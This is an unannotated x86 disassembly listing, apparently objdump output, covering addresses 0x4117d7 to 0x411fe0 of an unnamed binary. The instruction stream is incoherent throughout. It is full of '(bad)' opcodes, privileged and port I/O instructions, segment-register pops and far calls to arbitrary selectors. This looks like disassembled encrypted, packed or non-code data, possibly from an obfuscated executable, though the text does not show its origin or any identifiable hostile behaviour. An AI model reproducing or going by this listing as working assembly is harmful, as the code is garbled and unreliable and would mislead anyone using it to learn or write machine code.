  4117d7:	mov    BYTE PTR [edx-0x26],dl
  4117da:	je     0x4117b0
  4117dc:	mov    edx,DWORD PTR [esi-0x7b56ee44]
  4117e2:	xchg   ecx,eax
  4117e3:	jae    0x41185b
  4117e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e6:	(bad)  
  4117e7:	mov    ecx,esp
  4117e9:	add    eax,0xb8996bac
  4117ee:	sar    edi,0xdb
  4117f1:	and    al,0x82
  4117f3:	pop    edi
  4117f4:	xor    edi,DWORD PTR [ebx]
  4117f6:	ficom  WORD PTR [eax+ebp*4]
  4117f9:	push   ebp
  4117fa:	and    dl,al
  4117fc:	mov    DWORD PTR [edi],ecx
  4117fe:	scas   al,BYTE PTR es:[edi]
  4117ff:	mov    ecx,0xe5d08b1f
  411804:	lahf   
  411805:	pop    ds
  411806:	mov    BYTE PTR [esi-0x4d],bh
  411809:	nop
  41180a:	mov    bh,0x96
  41180c:	sahf   
  41180d:	inc    BYTE PTR es:[eax]
  411810:	add    ch,0x65
  411813:	sbb    esp,DWORD PTR [ecx+0x14bc95dd]
  411819:	xor    edx,DWORD PTR [ecx+0x21]
  41181c:	fwait
  41181d:	add    bl,BYTE PTR [ecx+eiz*8]
  411820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411821:	xchg   esi,eax
  411822:	mov    edx,0x1e3184a4
  411827:	shr    DWORD PTR [esi+eiz*2+0x6590fff],cl
  41182e:	push   ecx
  41182f:	adc    eax,0xd9b77266
  411834:	pop    es
  411835:	push   ds
  411836:	pop    ds
  411837:	xor    edi,edi
  411839:	jmp    0xc1a0be47
  41183e:	push   esi
  41183f:	ret    0x5c4
  411842:	xchg   edx,eax
  411843:	pop    ebx
  411844:	sti    
  411845:	cmc    
  411846:	xchg   ebp,eax
  411847:	push   esi
  411848:	dec    edi
  411849:	or     dl,BYTE PTR [ecx]
  41184b:	push   ss
  41184c:	je     0x4118cb
  41184e:	es pop ds
  411850:	mov    BYTE PTR [ebp+0x69c3ca2c],al
  411856:	nop
  411857:	aaa    
  411858:	mov    cl,0xd9
  41185a:	push   esi
  41185b:	int3   
  41185c:	jnp    0x4118a4
  41185e:	xor    al,0xee
  411860:	or     al,BYTE PTR [ebx]
  411862:	das    
  411863:	inc    ebp
  411864:	mov    edx,0x88661361
  411869:	mov    ch,0x1c
  41186b:	into   
  41186c:	jecxz  0x41188c
  41186e:	inc    ebp
  41186f:	(bad)  
  411872:	(bad)  
  411873:	stos   BYTE PTR es:[edi],al
  411874:	mov    cs,ebx
  411876:	stos   BYTE PTR es:[edi],al
  411877:	fist   WORD PTR [esi+0x598ea783]
  41187d:	sti    
  41187e:	dec    esi
  41187f:	out    0xb5,al
  411881:	pop    edi
  411882:	push   eax
  411883:	jp     0x41180d
  411885:	push   edi
  411886:	inc    ebp
  411887:	mov    ecx,DWORD PTR [edx+0x60]
  41188a:	mov    ah,0xd5
  41188c:	mov    DWORD PTR [eax+esi*4+0x39090e07],esi
  411893:	int3   
  411894:	mov    DWORD PTR [ebp-0x4b],esp
  411897:	sbb    BYTE PTR [ecx-0x28e818ba],dl
  41189d:	add    eax,0x8b191328
  4118a2:	push   edx
  4118a3:	out    dx,al
  4118a4:	dec    eax
  4118a5:	dec    ebx
  4118a6:	pop    ds
  4118a7:	xor    DWORD PTR [ebx-0x60],esp
  4118aa:	outs   dx,DWORD PTR ds:[esi]
  4118ab:	(bad)  
  4118ac:	dec    eax
  4118ad:	es call esp
  4118b0:	cld    
  4118b1:	adc    ah,BYTE PTR [di]
  4118b4:	lock sbb ch,cl
  4118b7:	inc    ecx
  4118b8:	mov    ch,0x99
  4118ba:	lahf   
  4118bb:	jg     0x4118cc
  4118bd:	jne    0x4118c3
  4118bf:	mov    bh,0xb1
  4118c1:	xchg   ebp,eax
  4118c2:	mov    eax,0x8402c209
  4118c7:	(bad)  
  4118c8:	repnz mov ebx,0x11cff9e3
  4118ce:	pop    ds
  4118cf:	cmp    eax,esi
  4118d1:	xchg   DWORD PTR [edx],ebp
  4118d3:	cmp    BYTE PTR [esi],0xcd
  4118d6:	stc    
  4118d7:	aam    0xfd
  4118d9:	aam    0x89
  4118db:	sbb    eax,esp
  4118dd:	test   eax,0x32713cfe
  4118e2:	pop    ds
  4118e3:	inc    edi
  4118e4:	xchg   esi,eax
  4118e5:	daa    
  4118e6:	sbb    eax,0xf902106b
  4118eb:	aad    0xd2
  4118ed:	mov    edi,0xbba3e802
  4118f2:	aas    
  4118f3:	stc    
  4118f4:	mov    ebp,ebp
  4118f6:	add    BYTE PTR [eax+ebp*8-0x71],dl
  4118fa:	enter  0x732b,0x2
  4118fe:	call   0x9980:0x571c0339
  411905:	and    bl,BYTE PTR [esi]
  411907:	arpl   WORD PTR [edx],sp
  411909:	and    edi,ebp
  41190b:	out    0xca,eax
  41190d:	xchg   esi,eax
  41190e:	push   0xeae3eed5
  411913:	cmp    eax,0xd8d80bb9
  411918:	ins    BYTE PTR es:[edi],dx
  411919:	aam    0x60
  41191b:	sbb    DWORD PTR [eax],esp
  41191d:	or     ah,BYTE PTR [eax]
  41191f:	push   ebp
  411920:	inc    eax
  411921:	fimul  DWORD PTR [esi-0x2b]
  411924:	mov    edx,DWORD PTR [esp+ebp*4]
  411927:	inc    edx
  411928:	ret    
  411929:	out    0xa9,al
  41192b:	out    0x89,eax
  41192d:	and    ebp,DWORD PTR [edx-0x4486f804]
  411933:	shl    dh,0xf
  411936:	adc    esp,edi
  411938:	mov    al,0x8d
  41193a:	fwait
  41193b:	js     0xbf135843
  411941:	call   0xf935:0x1f887e73
  411948:	in     al,dx
  411949:	push   eax
  41194a:	mov    esp,0x9a4a5580
  41194f:	jnp    0x4119cd
  411951:	add    ah,BYTE PTR [edx]
  411953:	leave  
  411954:	dec    esp
  411955:	adc    BYTE PTR [ebp-0x263476e7],dh
  41195b:	js     0x411984
  41195d:	loope  0x41195e
  41195f:	mov    DWORD PTR [eax-0x76],edx
  411962:	imul   edi,DWORD PTR [esi-0x7a],0xf960773a
  411969:	ret    0xe6e3
  41196c:	and    eax,0xcea11e1d
  411971:	or     ecx,ecx
  411973:	fs data16 aam 0xd2
  411977:	cwde   
  411978:	inc    ecx
  411979:	cmp    bh,BYTE PTR [ecx-0x1a9082b]
  41197f:	jl     0x41195a
  411981:	push   ecx
  411982:	ins    BYTE PTR es:[edi],dx
  411983:	or     ebx,DWORD PTR [ebx-0x62]
  411986:	int3   
  411987:	inc    ebx
  411988:	test   eax,0x34f838f8
  41198d:	add    esi,DWORD PTR [edx-0x28]
  411990:	mov    edx,0x24f1f76c
  411995:	mov    bl,0x60
  411997:	sub    esi,esp
  411999:	pusha  
  41199a:	push   edi
  41199b:	stos   BYTE PTR es:[edi],al
  41199c:	aam    0x24
  41199e:	xor    esi,edx
  4119a0:	call   0x9743:0xb60a705f
  4119a7:	in     eax,dx
  4119a8:	sub    DWORD PTR ds:0x5302f31f,edx
  4119ae:	push   es
  4119af:	pop    edi
  4119b0:	and    DWORD PTR [edi+eiz*4+0x7402f1b5],esi
  4119b7:	cmp    BYTE PTR [edi+0x4f],ch
  4119ba:	pop    ecx
  4119bb:	add    eax,0x9b1f22f3
  4119c0:	pop    eax
  4119c1:	xchg   BYTE PTR [edi+0x4a],ch
  4119c4:	or     al,bl
  4119c6:	mov    ds:0x9005f3c9,al
  4119cb:	cmp    BYTE PTR [ebx],cl
  4119cd:	fcom   DWORD PTR [esi+ecx*2]
  4119d0:	cdq    
  4119d1:	fldenv [eax-0x59]
  4119d4:	fnstenv [edx+0x8b80e0a]
  4119da:	rcl    ch,1
  4119dc:	das    
  4119dd:	dec    esp
  4119de:	aad    0xb4
  4119e0:	xor    al,0x61
  4119e2:	rcl    BYTE PTR [ebx-0x53605078],1
  4119e8:	mov    al,0x7d
  4119ea:	in     eax,dx
  4119eb:	and    al,dh
  4119ed:	add    eax,0x6d0fbb1a
  4119f2:	add    edi,DWORD PTR [edi+0x24]
  4119f5:	adc    eax,0x303ed98
  4119fa:	div    DWORD PTR [ebx-0x1e47e5f9]
  411a00:	outs   dx,DWORD PTR ds:[esi]
  411a01:	sbb    eax,0x3ee26aee
  411a06:	xor    BYTE PTR [ebx],0x8
  411a09:	aas    
  411a0a:	(bad)  
  411a0c:	mov    ah,BYTE PTR [ebx+0x6bbebeed]
  411a12:	cmp    DWORD PTR [eax],0xd47c7268
  411a18:	mov    edx,0x35d7d042
  411a1d:	ins    DWORD PTR es:[edi],dx
  411a1e:	int    0x46
  411a20:	pop    ecx
  411a21:	arpl   WORD PTR [ecx+edx*2-0x3b],bp
  411a25:	xchg   ebp,eax
  411a26:	mov    ah,BYTE PTR [ebx-0xe3272f7]
  411a2c:	in     al,dx
  411a2d:	xor    eax,0x62d7fb2a
  411a32:	mov    edx,0xc9c9881e
  411a37:	add    BYTE PTR [ebx+0x41],ch
  411a3a:	pop    edx
  411a3b:	xor    BYTE PTR [ebx+0x10121602],al
  411a41:	adc    al,ah
  411a43:	sbb    bl,0x38
  411a46:	push   ds
  411a47:	loope  0x411a6b
  411a49:	or     BYTE PTR [ebp-0x3c8911b],0xc1
  411a50:	test   BYTE PTR ds:0xf3c77ddc,al
  411a56:	inc    ebp
  411a57:	inc    edx
  411a58:	mov    ds:0x27811f33,al
  411a5d:	push   di
  411a5f:	and    DWORD PTR [esi+0x7cd732a6],edi
  411a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a66:	fxtract 
  411a68:	int    0x18
  411a6a:	nop
  411a6b:	in     al,dx
  411a6c:	xchg   ecx,ebp
  411a6e:	ss xchg ecx,eax
  411a70:	xor    ebp,ebx
  411a72:	ret    0xd2e3
  411a75:	and    bh,ah
  411a77:	push   cs
  411a78:	mov    ecx,0x694e5802
  411a7d:	sub    eax,0xf920e6c0
  411a82:	pop    ds
  411a83:	or     esi,DWORD PTR [ebp-0x27bc3b9d]
  411a89:	ret    
  411a8a:	xor    al,0xa5
  411a8c:	push   ebp
  411a8d:	(bad)
  411a91:	pop    ebp
  411a92:	fild   QWORD PTR [ecx+edi*1-0x76aaa583]
  411a99:	fwait
  411a9a:	mov    ebp,0xf1423b11
  411a9f:	enter  0x8da3,0x45
  411aa3:	add    ah,BYTE PTR [ebp+0x15]
  411aa6:	jbe    0x411a9f
  411aa8:	sbb    BYTE PTR [edi+0x2c99b7c],0xc5
  411aaf:	or     al,0xa8
  411ab1:	xlat   BYTE PTR ds:[ebx]
  411ab2:	pusha  
  411ab3:	lea    ebx,[ebx-0x75877ea9]
  411ab9:	addr16 inc eax
  411abb:	stos   DWORD PTR es:[edi],eax
  411abc:	jg     0x411ac4
  411abe:	push   ss
  411abf:	mov    eax,0xeff5fac5
  411ac5:	fcomp  QWORD PTR [edi]
  411ac7:	xchg   edi,eax
  411ac8:	outs   dx,DWORD PTR ds:[esi]
  411ac9:	test   eax,ebx
  411acb:	jbe    0x411ae9
  411acd:	sub    eax,0x7064ec10
  411ad2:	mov    edx,0x352f895c
  411ad7:	inc    ebp
  411ad8:	hlt    
  411ad9:	mov    ebp,0xbb8994c4
  411ade:	retf   0x79
  411ae1:	lock retf 
  411ae3:	int    0x3d
  411ae5:	sbb    eax,0xf2d4f716
  411aea:	ins    BYTE PTR es:[edi],dx
  411aeb:	and    al,0x38
  411aed:	fist   DWORD PTR [ebx]
  411aef:	imul   ecx,DWORD PTR [eax-0x1dd0d6f5],0x77e4b00
  411af9:	add    cl,BYTE PTR [edx-0x5b]
  411afc:	or     bl,BYTE PTR [eax-0x2e]
  411aff:	sbb    ebx,esp
  411b01:	enter  0x4962,0x9d
  411b05:	mov    ch,0xa1
  411b07:	popf   
  411b08:	sbb    BYTE PTR [edi+0x312e29f],dl
  411b0e:	cld    
  411b0f:	aaa    
  411b10:	pop    ecx
  411b11:	div    DWORD PTR [bx+si+0x4a]
  411b15:	dec    edi
  411b16:	push   ds
  411b17:	jnp    0x411aee
  411b19:	loope  0x411b77
  411b1b:	loop   0x411b45
  411b1d:	xchg   ecx,eax
  411b1e:	sbb    eax,0x739583d4
  411b23:	adc    DWORD PTR [ecx-0x6a],edi
  411b26:	loop   0x411b23
  411b28:	mov    bh,cl
  411b2a:	fcomp  DWORD PTR [edi+0x34252fa5]
  411b30:	jle    0x411b15
  411b32:	and    al,0xd7
  411b34:	retf   
  411b35:	ror    DWORD PTR [eax],cl
  411b37:	(bad)  
  411b38:	cmp    ah,BYTE PTR [ebp+0x6f]
  411b3b:	jmp    0x411aef
  411b3d:	and    edx,DWORD PTR [eax-0x56]
  411b40:	mov    BYTE PTR [ecx-0x6dad7ba7],al
  411b46:	mov    ebx,0xd1a40fd4
  411b4b:	mov    ch,0xa1
  411b4d:	mov    eax,ds:0x43883ce2
  411b52:	adc    al,0xae
  411b54:	and    eax,0xb119f1b5
  411b59:	add    cl,al
  411b5b:	jp     0x411bb8
  411b5d:	fcmovbe st,st(1)
  411b5f:	sahf   
  411b60:	scas   al,BYTE PTR es:[edi]
  411b61:	pop    sp
  411b63:	and    ebx,edx
  411b65:	sub    ebx,DWORD PTR [edi-0xd5b2e0e]
  411b6b:	push   esi
  411b6c:	cmp    al,0xe1
  411b6e:	mov    bh,0xd5
  411b70:	in     eax,0xb2
  411b72:	rcr    DWORD PTR [ecx+0x73],cl
  411b75:	pop    esp
  411b76:	mov    ah,bh
  411b78:	mov    al,0x87
  411b7a:	push   0x404c8ac8
  411b7f:	retf   0x3004
  411b82:	out    dx,eax
  411b83:	inc    edx
  411b84:	xor    eax,0xd142be03
  411b89:	sbb    al,0xcd
  411b8b:	xchg   esp,eax
  411b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b8d:	cmp    DWORD PTR [esi-0x25],0xffffff81
  411b91:	dec    esi
  411b92:	mov    cl,0xbd
  411b94:	sub    al,0xc2
  411b96:	shr    DWORD PTR [edx-0x617611ec],1
  411b9c:	aas    
  411b9d:	inc    edx
  411b9e:	rcr    BYTE PTR [edi+0x3a196b9b],cl
  411ba4:	mov    dh,BYTE PTR [ecx-0x2f]
  411ba7:	out    0xce,eax
  411ba9:	xchg   esi,eax
  411baa:	(bad)  
  411bab:	xor    ecx,DWORD PTR [ebx+eax*8]
  411bae:	ja     0x411bc8
  411bb0:	repnz add bl,BYTE PTR [edx+0x2b]
  411bb4:	jmp    edx
  411bb6:	jl     0x411bdc
  411bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bb9:	cwde   
  411bba:	pop    ds
  411bbb:	xchg   ecx,eax
  411bbc:	into   
  411bbd:	stc    
  411bbe:	fimul  DWORD PTR [esi-0x3296d7a2]
  411bc4:	out    0x89,eax
  411bc6:	lahf   
  411bc7:	imul   ebp,DWORD PTR [ecx],0xffffffb2
  411bca:	pop    edx
  411bcb:	inc    eax
  411bcc:	and    BYTE PTR [ebp+0x6c],ch
  411bcf:	xor    bl,BYTE PTR [edx-0x3628d6fc]
  411bd5:	dec    edx
  411bd6:	fnop   
  411bd8:	mov    BYTE PTR [edi-0x58],bl
  411bdb:	ret    
  411bdc:	and    DWORD PTR [esi],ebp
  411bde:	mov    dl,0x13
  411be0:	adc    BYTE PTR ds:0x695f1cee,ah
  411be6:	pop    ds
  411be7:	sub    dl,bh
  411be9:	out    0x4b,al
  411beb:	jnp    0x411b7b
  411bed:	cdq    
  411bee:	(bad)  
  411bef:	mov    esp,0x52d274f8
  411bf4:	jnp    0x411bd9
  411bf6:	add    ah,al
  411bf8:	cs sbb eax,0xd5ae4190
  411bfe:	es dec edx
  411c00:	sub    BYTE PTR [ecx],bh
  411c02:	or     cl,bl
  411c04:	xchg   BYTE PTR [ebx-0x13],bh
  411c07:	or     eax,0x555c76e1
  411c0c:	aad    0x31
  411c0e:	xchg   ecx,eax
  411c0f:	xchg   edi,eax
  411c10:	sub    eax,DWORD PTR [ebp-0x2c]
  411c13:	xor    al,0x1f
  411c15:	and    BYTE PTR [ebx+0x528a3402],0x85
  411c1c:	mov    BYTE PTR [edi+0xc],bl
  411c1f:	inc    ebx
  411c20:	push   0x29
  411c22:	inc    esi
  411c23:	loop   0x411bc3
  411c25:	add    dh,al
  411c27:	in     eax,0x4f
  411c29:	aad    0x87
  411c2b:	add    bh,BYTE PTR [edx-0x77cc814e]
  411c31:	(bad)  
  411c33:	shl    DWORD PTR [edi-0x265c19cb],0x5
  411c3a:	cli    
  411c3b:	mov    edx,0x559cc18f
  411c40:	jg     0x411cb2
  411c42:	gs push ebx
  411c44:	mov    ecx,0x43864656
  411c49:	arpl   WORD PTR [ebx+0x3a0117c9],ax
  411c4f:	in     al,0x28
  411c51:	xor    BYTE PTR [eax],0x63
  411c54:	fld    st(0)
  411c56:	rcl    DWORD PTR [edi+eiz*8+0x2c],0xb4
  411c5b:	pop    ss
  411c5c:	bound  ebx,QWORD PTR [edx+0x7c]
  411c5f:	rcl    DWORD PTR [edi+eax*4],0x71
  411c63:	adc    eax,0xbd301cc7
  411c68:	mov    dl,0x5
  411c6a:	cld    
  411c6b:	cld    
  411c6c:	sub    ch,ch
  411c6e:	push   ebp
  411c6f:	mov    al,0x6c
  411c71:	and    al,0x91
  411c73:	scas   eax,DWORD PTR es:[edi]
  411c74:	loopne 0x411c7b
  411c76:	or     eax,0x1fc68b65
  411c7b:	cmp    al,0xf5
  411c7d:	pop    ds
  411c7e:	(bad)  
  411c7f:	fnstenv [eax-0x21aa1903]
  411c85:	mov    dh,0xa0
  411c87:	loopne 0x411c4a
  411c89:	dec    eax
  411c8a:	cwde   
  411c8b:	(bad)  [edx]
  411c8d:	add    dh,BYTE PTR [esi+0x15]
  411c90:	aam    0x21
  411c92:	imul   edi,ebx,0x13
  411c95:	add    ch,BYTE PTR [eax-0x16060d66]
  411c9b:	jne    0x411cbb
  411c9d:	xor    esp,DWORD PTR [eax+0x33]
  411ca0:	stos   DWORD PTR es:[edi],eax
  411ca1:	(bad)  
  411ca2:	(bad)  
  411ca3:	call   0x4549cabe
  411ca8:	and    al,0x24
  411caa:	fcmove st,st(2)
  411cac:	push   esi
  411cad:	xchg   ebp,eax
  411cae:	lahf   
  411caf:	call   0x504583ac
  411cb4:	mov    BYTE PTR [ebp+0x7e],dh
  411cb7:	and    esp,DWORD PTR [bx+si]
  411cba:	inc    ebp
  411cbb:	das    
  411cbc:	jge    0x411cb2
  411cbe:	ror    BYTE PTR [eax-0xe09fcef],1
  411cc4:	pushw  ss
  411cc6:	xor    eax,0x1fc5780a
  411ccb:	xlat   BYTE PTR ds:[ebx]
  411ccc:	sbb    BYTE PTR [eax+edi*2],0x1a
  411cd0:	call   0xe1e4:0x40d20738
  411cd7:	sbb    al,0x45
  411cd9:	imul   esp,DWORD PTR [eax+0x79e24f30],0x1a
  411ce0:	jmp    0x56847db3
  411ce5:	inc    DWORD PTR [edi-0x1988911f]
  411ceb:	call   0x2eba:0x55962908
  411cf2:	add    eax,0x1e64eeee
  411cf7:	inc    ebp
  411cf8:	adc    BYTE PTR [esi+edx*8-0x10],al
  411cfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cfd:	(bad)  
  411cfe:	aam    0xb9
  411d00:	(bad)  
  411d01:	jl     0x411ca5
  411d03:	outs   dx,DWORD PTR ds:[esi]
  411d04:	inc    ebx
  411d05:	dec    esp
  411d06:	lods   al,BYTE PTR ds:[esi]
  411d07:	xlat   BYTE PTR ds:[ebx]
  411d08:	scas   al,BYTE PTR es:[edi]
  411d09:	arpl   WORD PTR [eax+0x1fea9bc5],di
  411d0f:	sti    
  411d10:	call   0x1aeaa4f1
  411d15:	sti    
  411d16:	cmc    
  411d17:	aad    0x75
  411d19:	jno    0x411d5a
  411d1b:	jno    0x411cd7
  411d1d:	popf   
  411d1e:	pop    edi
  411d1f:	and    ecx,DWORD PTR [eax-0x306c2427]
  411d25:	xor    cl,ah
  411d27:	imul   ebx,DWORD PTR [edi],0x1616fe02
  411d2d:	mov    ecx,0x2381eaf3
  411d32:	push   ds
  411d33:	adc    eax,0x5a5816d5
  411d38:	sbb    ch,dl
  411d3a:	mov    ebx,0xbf5af3d5
  411d3f:	push   esp
  411d40:	ds pop ecx
  411d42:	pop    ecx
  411d43:	inc    edi
  411d44:	cmp    BYTE PTR [edx-0x7f322b52],al
  411d4a:	mov    ebp,0x5b21be49
  411d4f:	lods   al,BYTE PTR ds:[esi]
  411d50:	mov    bl,0xc8
  411d52:	jbe    0x411dc7
  411d54:	xchg   ebx,eax
  411d55:	add    eax,0xdea91d37
  411d5a:	pusha  
  411d5b:	popa   
  411d5c:	loope  0x411d5f
  411d5e:	leave  
  411d5f:	(bad)  
  411d60:	or     al,0xe4
  411d62:	adc    BYTE PTR [edx+0x3728e9b0],bh
  411d68:	xchg   BYTE PTR [ebp-0x70b0d66],al
  411d6e:	out    dx,eax
  411d6f:	jo     0x411dc1
  411d71:	ja     0x411d4a
  411d73:	mov    bl,0x7a
  411d75:	dec    edx
  411d76:	fimul  WORD PTR cs:[ecx+0xe348b8]
  411d7d:	loop   0x411d3e
  411d7f:	aad    0x62
  411d81:	(bad)  
  411d83:	loope  0x411d18
  411d85:	push   es
  411d86:	mov    BYTE PTR cs:[bx],dh
  411d8a:	stc    
  411d8b:	daa    
  411d8c:	div    ch
  411d8e:	push   ecx
  411d8f:	je     0x411d4f
  411d91:	sbb    al,0x0
  411d93:	mov    ebx,0x5100b36f
  411d98:	cmp    DWORD PTR [edi-0x2870b0dc],ebx
  411d9e:	jbe    0x411dca
  411da0:	setp   BYTE PTR [edx]
  411da3:	xchg   edi,eax
  411da4:	out    dx,eax
  411da5:	mov    BYTE PTR [esi],bl
  411da7:	imul   edx,DWORD PTR [ebp+edi*4-0x10],0xffffffbb
  411dac:	sub    esi,ecx
  411dae:	mov    al,ds:0xfb8473cb
  411db3:	les    ecx,FWORD PTR [eax+0x39b78db3]
  411db9:	pop    eax
  411dba:	stc    
  411dbb:	fldenv ds:0xa7b0aa02
  411dc1:	jecxz  0x411d76
  411dc3:	jg     0x411d76
  411dc5:	pop    edi
  411dc6:	push   ds
  411dc7:	shl    DWORD PTR [eax+0x54b3aec9],cl
  411dcd:	dec    edi
  411dce:	dec    esi
  411dcf:	aam    0x86
  411dd1:	lods   eax,DWORD PTR ds:[esi]
  411dd2:	or     DWORD PTR [ebp+0xeec6883],esi
  411dd8:	xchg   DWORD PTR [ecx],edx
  411dda:	loopne 0x411dbd
  411ddc:	jle    0x411e22
  411dde:	pop    ds
  411ddf:	and    esi,DWORD PTR [edx]
  411de1:	pop    eax
  411de2:	mov    ds:0xe8a02ed5,eax
  411de7:	out    0xe1,eax
  411de9:	jbe    0x411db2
  411deb:	mov    esi,0x5326d189
  411df0:	mov    esp,0x464acd80
  411df5:	adc    eax,0xbd705b76
  411dfa:	fdiv   QWORD PTR ds:0xea2a810d
  411e00:	mov    BYTE PTR [ebx-0x1f3a5fe9],ch
  411e06:	fs push eax
  411e09:	add    bl,BYTE PTR [esp+edx*1-0x7dbfaf37]
  411e10:	mov    bh,0x91
  411e12:	pop    ds
  411e13:	(bad)  
  411e14:	shl    DWORD PTR [ecx],cl
  411e16:	retf   
  411e17:	mov    esp,0xd4e5879c
  411e1c:	pop    ds
  411e1d:	adc    eax,DWORD PTR [edi-0x149f36f4]
  411e23:	or     DWORD PTR [ecx-0x72b7ae23],0x74
  411e2a:	cli    
  411e2b:	fdivr  QWORD PTR [edx+eax*1-0x30]
  411e2f:	je     0x411e60
  411e31:	mov    esi,0x1b3e76bd
  411e36:	push   ds
  411e37:	mov    eax,ds:0x7e6f857f
  411e3c:	sub    al,dh
  411e3e:	and    al,0xd4
  411e40:	mov    dh,0xf1
  411e42:	jns    0x411e5c
  411e44:	dec    ecx
  411e45:	inc    edx
  411e46:	das    
  411e47:	jnp    0x411dd1
  411e49:	pop    edi
  411e4a:	addr16 jo 0x411e69
  411e4d:	push   edx
  411e4e:	mov    bl,bh
  411e50:	lahf   
  411e51:	add    eax,0xd0ebf3c2
  411e56:	shr    ch,cl
  411e58:	or     DWORD PTR [eax-0xf8690a0],0xffffffa5
  411e5f:	xor    al,0x2b
  411e61:	sub    eax,0x4e755c61
  411e66:	push   ds
  411e67:	hlt    
  411e68:	pop    es
  411e69:	test   BYTE PTR [esi+esi*2],bh
  411e6c:	add    dh,BYTE PTR [ebp+ecx*2+0x3d]
  411e70:	mov    al,0xcc
  411e72:	inc    ebx
  411e73:	push   ecx
  411e74:	mov    bh,bl
  411e76:	ret    0xcaae
  411e79:	mov    ecx,0xeb61d579
  411e7e:	inc    eax
  411e7f:	jl     0x411e72
  411e81:	cmp    eax,DWORD PTR [eax]
  411e83:	nop
  411e84:	call   0x3a05:0x9d536523
  411e8b:	test   eax,0xd475def4
  411e90:	iret   
  411e91:	xor    dl,al
  411e93:	hlt    
  411e94:	fld    TBYTE PTR [ecx-0x54]
  411e97:	add    eax,0x4ed88f8b
  411e9c:	sbb    dh,BYTE PTR [ecx+edi*2+0x7b99e8a0]
  411ea3:	mov    edx,0xe30f21c0
  411ea8:	enter  0x4d34,0x5d
  411eac:	inc    edi
  411ead:	dec    esp
  411eae:	ins    DWORD PTR es:[edi],dx
  411eaf:	jae    0x411f23
  411eb1:	sub    eax,0xd7090d09
  411eb6:	aam    0x1a
  411eb8:	add    DWORD PTR [edx],eax
  411eba:	push   edx
  411ebb:	scas   eax,DWORD PTR es:[edi]
  411ebc:	jle    0x411f01
  411ebe:	mov    BYTE PTR [esi+0x44],ch
  411ec1:	call   0x7b1d:0x249dbb7e
  411ec8:	loope  0x411ef1
  411eca:	not    ch
  411ecc:	mov    edi,0x53886798
  411ed1:	add    ah,BYTE PTR [edx]
  411ed3:	or     al,0xf4
  411ed5:	fdiv   DWORD PTR [edx+0x6c1b593e]
  411edb:	test   eax,0x9f5d2334
  411ee0:	leave  
  411ee1:	ins    DWORD PTR es:[edi],dx
  411ee2:	(bad)  
  411ee3:	(bad)  
  411ee4:	mov    eax,0x11f0d04a
  411ee9:	xor    DWORD PTR ds:0xf7a3a5a7,0xffffff87
  411ef0:	clc    
  411ef1:	sti    
  411ef2:	loope  0x411ec9
  411ef4:	retf   0xb6e6
  411ef7:	mov    eax,ds:0xd6bbe836
  411efc:	jno    0x411f7a
  411efe:	(bad)  
  411eff:	test   DWORD PTR [eax],eax
  411f01:	out    dx,al
  411f02:	inc    esp
  411f03:	cmp    eax,0x371f409b
  411f08:	adc    bl,ch
  411f0a:	pop    edi
  411f0b:	fs dec esp
  411f0d:	jbe    0x411ea5
  411f0f:	aad    0x81
  411f11:	(bad)  
  411f12:	loop   0x411eb8
  411f14:	es in  al,dx
  411f16:	mov    es,esi
  411f18:	mov    DWORD PTR ds:0x2eabbe30,edi
  411f1e:	add    bl,BYTE PTR [eax]
  411f20:	mov    DWORD PTR ds:0xd1fa1c76,0x1855d0cb
  411f2a:	stos   DWORD PTR es:[edi],eax
  411f2b:	sbb    edi,DWORD PTR [edi-0x1446828c]
  411f31:	test   DWORD PTR [edx],ebx
  411f33:	fsub   DWORD PTR [esi+0x16]
  411f36:	dec    esp
  411f37:	aad    0xc8
  411f39:	ins    DWORD PTR es:[edi],dx
  411f3a:	sbb    eax,0x9d0b0e08
  411f3f:	nop
  411f40:	jns    0x411f88
  411f42:	popf   
  411f43:	ins    DWORD PTR es:[edi],dx
  411f44:	and    al,0x2
  411f46:	jae    0x411f8f
  411f48:	int    0x4e
  411f4a:	or     ebp,DWORD PTR [esi+0x62]
  411f4d:	add    eax,DWORD PTR [eax]
  411f4f:	and    BYTE PTR [eax],bl
  411f51:	mov    ebp,0x8c9b3db
  411f56:	pusha  
  411f57:	or     ebp,DWORD PTR [eax+0x5c1a9287]
  411f5d:	jne    0x411fd2
  411f5f:	mov    ebx,0x24b647f5
  411f64:	leave  
  411f65:	xor    eax,0x12869750
  411f6a:	pop    ds
  411f6b:	push   edi
  411f6c:	add    eax,DWORD PTR [edx-0x2c85c3af]
  411f72:	out    0xd4,al
  411f74:	xor    edi,eax
  411f76:	aaa    
  411f77:	fmul   QWORD PTR [edi-0x61]
  411f7a:	rol    ch,1
  411f7c:	mov    cl,0x51
  411f7e:	cld    
  411f7f:	push   edi
  411f80:	or     BYTE PTR [ebx],bl
  411f82:	ror    dl,cl
  411f84:	xchg   bh,al
  411f86:	test   ebp,0x8f3e0159
  411f8c:	leave  
  411f8d:	fwait
  411f8e:	sub    BYTE PTR [ebx],bh
  411f90:	out    dx,eax
  411f91:	mov    ds:0x4589a600,al
  411f96:	mov    bl,0x31
  411f98:	loop   0x411fa3
  411f9a:	cmp    esp,DWORD PTR [edi-0x31cdfd31]
  411fa0:	idiv   dl
  411fa2:	cmp    DWORD PTR [ecx],0x1f
  411fa5:	adc    eax,0xf5ea751e
  411faa:	lods   al,BYTE PTR ds:[esi]
  411fab:	fwait
  411fac:	pop    esp
  411fad:	xor    edi,DWORD PTR ds:0xa7b3f1d7
  411fb3:	xchg   esi,eax
  411fb4:	xchg   esi,eax
  411fb5:	cld    
  411fb6:	(bad)  
  411fb7:	fld    TBYTE PTR [edi-0x76e5da2f]
  411fbd:	add    eax,0x2798dce8
  411fc2:	mov    dl,0xba
  411fc4:	stos   BYTE PTR es:[edi],al
  411fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fc6:	lds    esi,FWORD PTR [edi-0x80]
  411fc9:	jb     0x412021
  411fcb:	push   edx
  411fcc:	hlt    
  411fcd:	sub    bh,0x82
  411fd0:	(bad)  
  411fd2:	or     dl,0x89
  411fd5:	fnstsw WORD PTR [ecx-0x43]
  411fd8:	hlt    
  411fd9:	sub    ecx,DWORD PTR [ebx+0x7c]
  411fdc:	test   BYTE PTR [edi],ah
  411fde:	jo     0x411fa8
  411fe0:	in     eax,dx
